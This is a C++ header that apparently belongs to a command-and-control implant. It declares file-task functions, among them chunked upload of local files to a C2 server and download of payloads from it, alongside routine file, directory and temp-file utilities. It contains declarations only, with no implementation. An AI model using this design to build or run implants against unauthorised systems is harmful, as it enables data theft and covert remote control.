#pragma once

#include "json.hpp"
#include <string>
#include <vector>

using json = nlohmann::json;

namespace Tasks {
namespace File {

    // File operation result structure
    struct FileResult {
        bool success;
        std::string message;
        size_t bytesTransferred;
        
        FileResult(bool s = false, const std::string& msg = "", size_t bytes = 0) 
            : success(s), message(msg), bytesTransferred(bytes) {}
    };

    // File information structure
    struct FileInfo {
        std::string path;
        std::string name;
        size_t size;
        bool exists;
        bool isDirectory;
        std::string lastModified;
        
        FileInfo() : size(0), exists(false), isDirectory(false) {}
    };

    /**
     * Upload a file to the C2 server with chunked transfer
     * @param taskId Task ID for tracking the upload
     * @param filePath Local file path to upload
     * @param outputMessage Output message describing result
     * @return true if upload successful, false otherwise
     */
    bool UploadFile(const std::string& taskId, const std::string& filePath, std::string& outputMessage);

    /**
     * Download a file payload from the C2 server
     * @param task JSON task object containing file_id and task_id
     * @return File content as string, empty if failed
     */
    std::string DownloadFilePayload(const json& task);

    /**
     * Download a file and save it to specified path
     * @param task JSON task object with file info
     * @param destinationPath Where to save the downloaded file
     * @return FileResult with operation status
     */
    FileResult DownloadFile(const json& task, const std::string& destinationPath);

    /**
     * Get information about a file or directory
     * @param path File or directory path
     * @return FileInfo structure with file details
     */
    FileInfo GetFileInfo(const std::string& path);

    /**
     * Check if a file exists and is accessible
     * @param filePath Path to check
     * @return true if file exists and is readable
     */
    bool FileExists(const std::string& filePath);

    /**
     * Get the size of a file in bytes
     * @param filePath Path to the file
     * @return File size in bytes, or 0 if file doesn't exist/error
     */
    size_t GetFileSize(const std::string& filePath);

    /**
     * Create a directory (and parent directories if needed)
     * @param dirPath Directory path to create
     * @return true if directory created or already exists
     */
    bool CreateDirectory(const std::string& dirPath);

    /**
     * Delete a file
     * @param filePath Path to file to delete
     * @return true if file deleted successfully
     */
    bool DeleteFile(const std::string& filePath);

    /**
     * Copy a file from source to destination
     * @param sourcePath Source file path
     * @param destPath Destination file path
     * @param overwrite Whether to overwrite existing destination file
     * @return FileResult with operation status
     */
    FileResult CopyFile(const std::string& sourcePath, const std::string& destPath, bool overwrite = false);

    /**
     * Move/rename a file
     * @param sourcePath Current file path
     * @param destPath New file path
     * @return FileResult with operation status
     */
    FileResult MoveFile(const std::string& sourcePath, const std::string& destPath);

    /**
     * List contents of a directory
     * @param dirPath Directory path to list
     * @param recursive Whether to list subdirectories recursively
     * @return Vector of FileInfo objects for directory contents
     */
    std::vector<FileInfo> ListDirectory(const std::string& dirPath, bool recursive = false);

    /**
     * Get directory listing as formatted string
     * @param dirPath Directory path to list
     * @param showHidden Whether to show hidden files
     * @return Formatted directory listing string
     */
    std::string GetDirectoryListing(const std::string& dirPath, bool showHidden = false);

    /**
     * Extract filename from a full path
     * @param fullPath Full file path
     * @return Filename without path
     */
    std::string ExtractFileName(const std::string& fullPath);

    /**
     * Extract directory path from a full path
     * @param fullPath Full file path
     * @return Directory path without filename
     */
    std::string ExtractDirectoryPath(const std::string& fullPath);

    /**
     * Get file extension from filename
     * @param filename Filename or path
     * @return File extension (including dot), empty if no extension
     */
    std::string GetFileExtension(const std::string& filename);

    /**
     * Validate file path for security (prevent directory traversal, etc.)
     * @param filePath Path to validate
     * @return true if path is safe to use
     */
    bool ValidateFilePath(const std::string& filePath);

    /**
     * Read file contents into string (for text files)
     * @param filePath Path to file to read
     * @param maxSize Maximum file size to read (safety limit)
     * @return File contents as string, empty if failed
     */
    std::string ReadTextFile(const std::string& filePath, size_t maxSize = 1024 * 1024);

    /**
     * Write string content to file
     * @param filePath Path where to write file
     * @param content Content to write
     * @param append Whether to append to existing file (vs overwrite)
     * @return true if write successful
     */
    bool WriteTextFile(const std::string& filePath, const std::string& content, bool append = false);

    /**
     * Get available disk space for a given path
     * @param path Path to check (file or directory)
     * @return Available space in bytes, 0 if error
     */
    uint64_t GetAvailableSpace(const std::string& path);

    /**
     * Get temporary directory path
     * @return Path to system temporary directory
     */
    std::string GetTempDirectory();

    /**
     * Create a temporary file with unique name
     * @param prefix Prefix for the temporary filename
     * @param extension File extension (including dot)
     * @return Path to created temporary file, empty if failed
     */
    std::string CreateTempFile(const std::string& prefix = "tmp", const std::string& extension = ".tmp");

} // namespace File
} // namespace Tasks